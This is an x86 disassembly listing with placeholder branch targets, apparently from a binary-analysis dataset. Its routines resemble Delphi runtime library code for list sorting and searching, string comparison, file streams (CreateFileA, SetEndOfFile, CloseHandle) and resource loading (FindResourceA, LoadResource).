pop edi
pop esi
pop ebx
retn
sub_3a7c6d0
push ebx
mov ebx [ eax + 0x18 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x18 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_3a7c6f4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x1c ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
movzx eax [ esp + 0x8 ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x18 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
mov [ esp + 0x10 ] eax
cmp [ esp + 0x10 ] 0x0
jge r-xdata
mov eax ebx
dec eax
mov [ esp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x25 ] 0x1
je r-xdata
mov esi ebx
sub_3a7c778
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_3a7b948
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x18 ]
mov edx [ edx + esi * 8 ]
call sub_3a652f4
pop edi
pop esi
pop ebx
retn
sub_3a7c7b4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_3a7b948
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_3a7c7dc
push esi
mov edx [ eax + 0x20 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_3a7c810
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_3a7bc24
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_3a7c85c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_3a7b948
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_3a7b948
cmp esi [ ebx + 0x1c ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_3a7c8b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x20 ]
jne r-xdata
mov eax [ ebx + 0x1c ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_3a7c7dc
mov eax [ ebx + 0x18 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_3a652f4
inc [ ebx + 0x1c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x18 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x18 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
add ecx ecx
mov eax edx
pop edx
call sub_3a63154
sub_3a7c92c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_3a7b948
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_3a7b948
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x18 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_3a652f4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_3a7c988
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_3a7b948
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x18 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_3a7c9c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a7c6d0
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a7c9c8
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3a7ca5c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
add edx edx
add edx edx
add edx edx
lea eax [ ebx + 0x18 ]
call sub_3a62f14
mov [ ebx + 0x20 ] esi
pop esi
pop ebx
retn
sub_3a7ca78
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x24 ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_3a7cab0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x18 ]
mov ecx [ eax + ecx * 8 ]
mov eax [ esi + 0x18 ]
mov edx [ eax + edi * 8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop edi
pop esi
pop ebx
retn
sub_3a7cae0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1c ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x1c ]
dec ecx
xor edx edx
mov eax ebx
call sub_3a7c9c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3a7cb18
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
cmp [ eax + 0x26 ] 0x0
je r-xdata
mov ebx edi
test ebx ebx
je r-xdata
mov ebx edi
test ebx ebx
je r-xdata
mov esi ebp
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov esi ebp
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax ebp
call sub_3a65730
push eax
push ebx
mov eax edi
call sub_3a65730
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
sub esi 0x4
mov esi [ esi ]
push esi
mov eax ebp
call sub_3a65730
push eax
push ebx
mov eax edi
call sub_3a65730
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
jmp r-xdata
sub esi 0x4
mov esi [ esi ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3a7cb9c
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_3a7cbd0
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_3a7cc34
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_3a7cc88
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_3a64260
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
mov esp ebp
pop ebp
retn
sub_3a7ccd4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a64258
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_3a7cc88
pop ecx
mov eax [ ebx ]
call sub_3a6430c
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
movzx edx [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_3a7cc88
pop ecx
sub_3a7cd58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
movzx ecx bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_3a7cdc8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
sub_3a7ce00
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
sub_3a7ce38
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_3a7cbbc
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_3a62ee0
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_3a7cf14
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7cf1b
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_3a62efc
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_3a7cdc8
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_3a7ce00
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_3a7cf2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7d714
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a7cf7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_3a7f95c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7cf83
mov eax [ ebp - 0x8 ]
call sub_3a64380
retn
sub_3a7cf94
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7d714
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a7cfe4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a811d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7cfeb
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
sub_3a7cff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a7d04c
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_3a69d18
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_3a7d08c
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_3a6ead0
pop ebx
pop ebp
retn 0x8
sub_3a7d0b4
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
movzx eax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_3a7d0f8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a7d0f8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_3a7d240
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_3a646e4
movzx edx di
mov eax esi
call sub_3a69c68
mov ecx eax
xor edx edx
mov eax ebx
call sub_3a7cff0
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax esi
call sub_3a65730
push eax
call CreateFileA
mov ecx eax
xor edx edx
mov eax ebx
call sub_3a7cff0
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_3a652f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7d247
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_3a652c4
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_3a6a064
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_3a6cae0
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_3a6a064
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_3a6cae0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
jmp r-xdata
sub_3a7d247
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a7d26c
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a7d2a8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_3a63154
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_3a7d2e0
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_3a7d31c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_3a7d0b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a7d367
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a7d304
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7d36e
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
sub_3a7d374
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
call sub_3a7d3a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a7d3b8
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_3a7cbbc
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_3a7cdc8
sub_3a7d3f0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_3a7d0b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a7d438
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a7d3b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7d43f
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
sub_3a7d444
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_3a7d2a0
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_3a7d46c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_3a7d444
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_3a7d498
push ebx
push ecx
mov ebx edx
cmp [ ebx ] 0x0
jle r-xdata
mov edx [ eax + 0x4 ]
mov [ esp ] edx
mov ecx [ ebx ]
mov edx [ eax + 0x10 ]
cmp ecx edx
je r-xdata
mov edx [ ebx ]
cmp edx [ eax + 0x8 ]
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
cmp [ ebx ] 0x0
jne r-xdata
mov edx [ ebx ]
add edx 0x1fff
and edx 0xffffe000
mov [ ebx ] edx
test edx edx
jne r-xdata
mov eax [ eax + 0x4 ]
call sub_3a62efc
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov edx [ ebx ]
mov eax esp
call sub_3a62f14
mov eax [ ebx ]
call sub_3a62ee0
mov [ esp ] eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
cmp [ esp ] 0x0
jne r-xdata
sub_3a7d518
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_3a63154
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_3a7d444
sub_3a7d568
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
call sub_3a65730
mov ecx eax
mov edx esi
mov eax edi
call sub_3a7d660
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a7d5c0
push ebp
mov ebp esp
add esp 0xfffffff0
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a7d652
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_3a65498
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a6986c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7d659
lea eax [ ebp - 0x10 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a7d660
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_3a7d5c0
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_3a7d2a0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebp
call sub_3a7d5c0
pop ecx
sub_3a7d6cc
push ebx
push esi
call sub_3a6478c
mov ebx edx
